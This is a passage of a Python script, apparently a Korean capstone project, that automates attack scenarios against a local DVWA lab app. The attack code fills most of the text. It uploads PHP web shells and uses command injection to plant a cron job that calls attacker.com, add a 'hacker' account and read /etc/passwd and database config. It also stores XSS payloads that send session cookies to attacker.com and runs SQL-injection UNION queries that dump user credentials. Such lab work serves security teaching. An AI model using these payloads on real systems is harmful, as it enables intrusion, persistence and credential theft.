    data = {"Upload": "Upload"}
    res = session.post(upload_url, files=files, data=data)
    print(f"  [-] 은닉 백도어 업로드 시도: .htaccess.php")
    if "succesfully uploaded" in res.text:
        print("  [+] 은닉 백도어 업로드 성공!")
    else:
        print("  [!] 업로드 실패")
    time.sleep(0.5)

    # 두 번째 백도어 (이미지로 위장)
    backdoor2_content = '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);}?>'
    files = {"uploaded": ("avatar.php", backdoor2_content, "application/x-php")}
    data = {"Upload": "Upload"}
    res = session.post(upload_url, files=files, data=data)
    print(f"  [-] 이미지 위장 백도어 업로드 시도: avatar.php")
    if "succesfully uploaded" in res.text:
        print("  [+] 위장 백도어 업로드 성공!")
    else:
        print("  [!] 업로드 실패")
    time.sleep(0.5)

    # --- Command Injection을 통한 크론잡 백도어 ---
    print("\n[*] === 크론잡 백도어 설치 시도 (Cron Persistence) ===")
    cmd_url = f"{DVWA_URL}/vulnerabilities/exec/"

    cron_cmds = [
        ("127.0.0.1; echo '* * * * * wget http://attacker.com/beacon' > /tmp/cron_backdoor 2>&1",
         "크론잡 파일 생성 시도"),
        ("127.0.0.1; cat /tmp/cron_backdoor 2>&1",
         "크론잡 파일 확인"),
        ("127.0.0.1; crontab -l 2>&1 | head -5",
         "현재 크론탭 확인"),
    ]
    for payload, desc in cron_cmds:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(cmd_url, data=data)
        print(f"  [-] {desc}")
        if res.status_code == 200:
            print("  [+] 명령 실행 완료")
        time.sleep(0.5)

    # --- 계정 추가 시도 ---
    print("\n[*] === 시스템 계정 추가 시도 (Account Persistence) ===")
    account_cmds = [
        ("127.0.0.1; cat /etc/passwd | grep -c ':' 2>&1", "현재 시스템 계정 수 확인"),
        ("127.0.0.1; useradd -m -s /bin/bash hacker 2>&1", "신규 계정(hacker) 생성 시도"),
        ("127.0.0.1; cat /etc/passwd | tail -3 2>&1", "계정 추가 결과 확인"),
    ]
    for payload, desc in account_cmds:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(cmd_url, data=data)
        print(f"  [-] {desc}")
        if "Permission denied" in res.text or "Operation not permitted" in res.text:
            print("  [!] 권한 부족 — www-data 사용자로는 불가")
        elif res.status_code == 200:
            print("  [+] 명령 실행 완료")
        time.sleep(0.5)

    # --- 백도어 접근 테스트 ---
    print("\n[*] === 백도어 접근 테스트 ===")
    backdoor_url = f"{DVWA_URL}/hackable/uploads/.htaccess.php"
    test_res = session.get(f"{backdoor_url}?q=echo+BACKDOOR_ALIVE")
    print(f"  [-] 백도어 생존 확인: {backdoor_url}")
    if "BACKDOOR_ALIVE" in test_res.text:
        print("  [+] 백도어 정상 작동! 지속적 접근 가능")
    else:
        print("  [!] 백도어 응답 없음")

    print("<<< 공격 완료\n")


def scenario_10_xss_session_hijack():
    """시나리오 10: [통합] Stored XSS 침투 → 세션 하이재킹 → 데이터 유출"""
    print(">>> [시나리오 10] Stored XSS 침투 → 세션 하이재킹 → 데이터 유출 시작")

    # ========================================
    # 단계 1: DVWA 침투 (Stored XSS)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 1] DVWA 침투 — Stored XSS 공격")
    print("=" * 50)

    xss_url = f"{DVWA_URL}/vulnerabilities/xss_s/"

    # --- 정찰 ---
    print("\n[*] === 정찰 단계 (Reconnaissance) ===")
    print("[*] Stored XSS 취약점 존재 여부 확인")

    # 정상 입력 테스트
    print("  [-] 정상 게시글 작성 테스트")
    data = {"txtName": "TestUser", "mtxMessage": "Hello, this is a test message.", "btnSign": "Sign Guestbook"}
    res = session.post(xss_url, data=data)
    if "Hello, this is a test message." in res.text:
        print("  [+] 게시글 작성 및 표시 확인")
    time.sleep(0.5)

    # HTML 태그 삽입 테스트
    print("  [-] HTML 태그 삽입 테스트")
    data = {"txtName": "ProbeUser", "mtxMessage": "<b>BOLD_PROBE</b>", "btnSign": "Sign Guestbook"}
    res = session.post(xss_url, data=data)
    if "<b>BOLD_PROBE</b>" in res.text:
        print("  [+] HTML 태그가 필터링 없이 삽입됨! XSS 취약점 확인")
    else:
        print("  [!] HTML 태그 필터링됨")
    time.sleep(0.5)

    # --- 침투: 악성 스크립트 삽입 ---
    print("\n[*] === 침투 단계 (Exploitation) ===")
    print("[*] 악성 JavaScript 삽입하여 세션 쿠키 탈취 스크립트 저장")

    # 단계별 XSS 공격
    xss_payloads = [
        {
            "txtName": "Hacker1",
            "mtxMessage": "<script>console.log('XSS_STAGE_1')</script>",
            "btnSign": "Sign Guestbook",
            "desc": "1단계: 콘솔 로그 테스트 (XSS 가능 확인)",
        },
        {
            "txtName": "Hacker2",
            "mtxMessage": "<script>document.write('<img src=\"http://attacker.com/steal?cookie='+document.cookie+'\">')</script>",
            "btnSign": "Sign Guestbook",
            "desc": "2단계: 쿠키 탈취 스크립트 삽입 (img 태그 방식)",
        },
        {
            "txtName": "Hacker3",
            "mtxMessage": "<script>new Image().src='http://attacker.com/log?c='+document.cookie;</script>",
            "btnSign": "Sign Guestbook",
            "desc": "3단계: 은밀한 쿠키 탈취 (Image 객체 방식)",
        },
    ]
    for payload in xss_payloads:
        desc = payload.pop("desc")
        res = session.post(xss_url, data=payload)
        print(f"  [-] {desc}")
        print(f"      페이로드: {payload['mtxMessage'][:80]}...")
        if payload["mtxMessage"] in res.text or "<script>" in res.text:
            print("  [+] 악성 스크립트가 페이지에 저장됨!")
        else:
            print("  [!] 삽입 결과 확인 필요")
        payload["desc"] = desc  # restore for safety
        time.sleep(0.8)

    # ========================================
    # 단계 2: 침투 후 공격 (세션 하이재킹 → 데이터 유출)
    # ========================================
    print("\n" + "=" * 50)
    print("[단계 2] 침투 후 공격 — 세션 하이재킹 및 데이터 유출")
    print("=" * 50)

    # --- 세션 하이재킹 시뮬레이션 ---
    print("\n[*] === 세션 하이재킹 시뮬레이션 ===")
    print("[*] 피해자가 XSS가 삽입된 페이지를 방문하면 쿠키가 공격자에게 전송됩니다.")

    # 현재 세션의 쿠키 정보 출력 (시뮬레이션)
    cookies = session.cookies.get_dict()
    print(f"  [+] 탈취된 세션 쿠키 (시뮬레이션):")
    for name, value in cookies.items():
        print(f"      > {name}: {value[:30]}...")
    time.sleep(0.5)

    # --- 탈취한 세션으로 관리자 기능 접근 ---
    print("\n[*] === 탈취한 세션으로 관리자 기능 접근 ===")
    print("[*] 세션 쿠키를 재사용하여 DVWA 관리 페이지 접근")

    admin_pages = [
        (f"{DVWA_URL}/security.php", "보안 설정 페이지"),
        (f"{DVWA_URL}/setup.php", "데이터베이스 설정 페이지"),
        (f"{DVWA_URL}/phpinfo.php", "PHP 서버 정보 페이지"),
    ]
    for page_url, desc in admin_pages:
        res = session.get(page_url)
        print(f"  [-] {desc} 접근: HTTP {res.status_code}")
        if res.status_code == 200:
            print(f"  [+] {desc} 접근 성공!")
        else:
            print(f"  [!] 접근 실패")
        time.sleep(0.3)

    # --- SQL Injection을 통한 데이터 유출 ---
    print("\n[*] === 관리자 세션으로 SQL Injection 수행 → 데이터 유출 ===")
    sqli_url = f"{DVWA_URL}/vulnerabilities/sqli/"

    print("[*] 관리자 권한의 세션으로 DB 데이터 탈취")
    sqli_payloads = [
        ("%' AND 1=0 UNION SELECT user, password FROM users #", "전체 사용자 크리덴셜 탈취"),
        ("1' AND 1=2 UNION SELECT null, @@datadir -- ", "DB 데이터 디렉토리 경로 추출"),
        ("1' AND 1=2 UNION SELECT null, CONCAT(user(),' | ',current_user()) -- ", "DB 연결 사용자 정보 추출"),
    ]
    for payload, desc in sqli_payloads:
        params = {"id": payload, "Submit": "Submit"}
        res = session.get(sqli_url, params=params)
        print(f"  [-] {desc}")
        print(f"      페이로드: {payload}")
        if "Surname:" in res.text:
            print("  [+] 데이터 유출 성공!")
            # 간단한 결과 파싱
            soup = BeautifulSoup(res.text, "html.parser")
            results = soup.find_all("pre")
            for r in results:
                text = r.get_text().strip()
                if "Surname:" in text:
                    for line in text.split("\n")[:3]:
                        stripped = line.strip()
                        if stripped:
                            print(f"      > {stripped}")
        else:
            print("  [!] 데이터 유출 실패")
        time.sleep(0.8)

    # --- 민감 파일 유출 (Command Injection 체인) ---
    print("\n[*] === 민감 파일 유출 (Command Injection 체인) ===")
    cmd_url = f"{DVWA_URL}/vulnerabilities/exec/"
    sensitive_cmds = [
        ("127.0.0.1; cat /etc/passwd | head -10", "시스템 계정 목록 탈취"),
        ("127.0.0.1; cat /var/www/html/config/config.inc.php 2>/dev/null | grep 'db_'",
         "DB 접속 정보 탈취"),
        ("127.0.0.1; ls -la /var/www/html/hackable/uploads/", "업로드된 파일 목록 (증거 확인)"),
    ]
    for payload, desc in sensitive_cmds:
        data = {"ip": payload, "Submit": "Submit"}
        res = session.post(cmd_url, data=data)
        print(f"  [-] {desc}")
        if res.status_code == 200:
            print("  [+] 명령 실행 완료 — 데이터 수집 성공")
        time.sleep(0.5)

    print("<<< 공격 완료\n")


# ============================================================
# 메인 함수
# ============================================================


def main():
    parser = argparse.ArgumentParser(
        description="캡스톤디자인 DVWA 공격 시나리오 자동화 스크립트"
    )
    parser.add_argument(
        "-s",
        "--scenario",
        type=int,
        choices=range(1, 11),
        help="실행할 DVWA 공격 시나리오 번호 (1~10)",
    )
    args = parser.parse_args()

    if not args.scenario:
        print("=" * 60)
        print("캡스톤디자인 DVWA 공격 시나리오 자동화 스크립트")
        print("=" * 60)
        print("\n[파트 1] DVWA 타깃 공격 (standalone DVWA, 기본 http://127.0.0.1:8080):")
        print("  1. 웹 로그인 폼 무차별 대입 (Brute Force)")
        print("  2. 시스템 명령어 삽입 (Command Injection)")
        print("  3. 자동화된 데이터베이스 유출 (SQL Injection)")
        print("  4. 웹 쉘(Web Shell) 업로드")
        print("  5. 악성 스크립트 반사 (Reflected XSS)")
        print("\n[파트 2] 통합 시나리오 — DVWA 침투 → 침투 후 공격:")
        print("  6. SQL Injection 침투 → 크리덴셜 탈취 → 시스템 침투")
        print("  7. Command Injection 침투 → 권한 상승 시도")
        print("  8. File Upload 침투 → 내부 정찰 및 횡적 이동")
        print("  9. Brute Force 침투 → 백도어 설치 및 지속성 확보")
        print("  10. Stored XSS 침투 → 세션 하이재킹 → 데이터 유출")
        print("\n사용법:")
        print("  python attack.py -s [DVWA_시나리오번호]")
        return

    # 시나리오 매핑
    scenarios = {
        # 파트 1: DVWA (세션 설정 필요)
        1: scenario_1_brute_force,
        2: scenario_2_command_injection,
        3: scenario_3_sql_injection,
        4: scenario_4_file_upload,
        5: scenario_5_reflected_xss,
        # 파트 2: 통합 시나리오 — DVWA 침투 → 침투 후 공격 (세션 설정 필요)
        6: scenario_6_sqli_credential_dump,
        7: scenario_7_cmd_injection_privesc,
        8: scenario_8_file_upload_lateral_movement,
        9: scenario_9_bruteforce_persistence,
        10: scenario_10_xss_session_hijack,
    }

    setup_dvwa_session()

    scenarios[args.scenario]()


if __name__ == "__main__":
    main()
